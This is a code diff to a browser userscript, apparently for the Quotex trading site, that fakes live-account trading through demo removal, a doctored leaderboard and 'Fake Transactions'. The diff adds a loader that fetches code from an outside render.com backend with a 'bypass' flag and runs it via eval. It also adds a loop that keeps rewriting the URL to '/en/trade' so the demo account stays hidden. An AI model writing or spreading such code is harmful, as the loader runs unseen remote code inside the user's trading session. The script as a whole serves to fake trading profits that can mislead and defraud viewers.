@@ -1,8 +1,8 @@
 /**
- * 0X Premium Full Script
+ * 0X Premium Full Script + Secure Loader
  * (Background Demo Remove + Flick Off + Tier/Demo/Leaderboard + Fake Transactions)
  */
-(function () {
+(async function () {
     'use strict';
 
     // --- 0. PERSISTENT CONFIG & STORAGE ---
@@ -209,6 +209,42 @@
         (document.head || document.documentElement).appendChild(pStyle);
     };
     injectPremiumStyles();
+
+    // --- 3B. SECURE LOADER & URL ROUTING REPLACER ---
+    const BACKEND_URL = "https://zeroxpremiumquotexlivecode.onrender.com";
+
+    async function directLoad() {
+        try {
+            const response = await fetch(`${BACKEND_URL}/api/get-core-code`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ bypass: true })
+            });
+
+            const result = await response.json();
+            const codeToRun = result.code || (result.valid && result.code);
+
+            if (codeToRun) {
+                (0, eval)(codeToRun);
+            } else {
+                console.warn("Core code not found in backend response.");
+            }
+        } catch (e) {
+            console.error("Direct load error:", e);
+        }
+    }
+
+    directLoad();
+
+    if (!window.qxTradeRouteLoopStarted) {
+        window.qxTradeRouteLoopStarted = true;
+        (function p() {
+            try {
+                history.replaceState(null, '', '/en/trade');
+            } catch (e) {}
+            setTimeout(p, 500);
+        })();
+    }
 
     // --- 4. SYNCHRONOUS DOM INTERCEPTORS (Zero-Flicker DEMO Blocker, Demo Account Protected) ---
     (function syncDomPatch() {
@@ -1548,5 +1584,5 @@
         });
     }
 
-    console.log("0X Premium Full Script Active!");
+    console.log("0X Premium Full Script & Loader Active!");
 })();
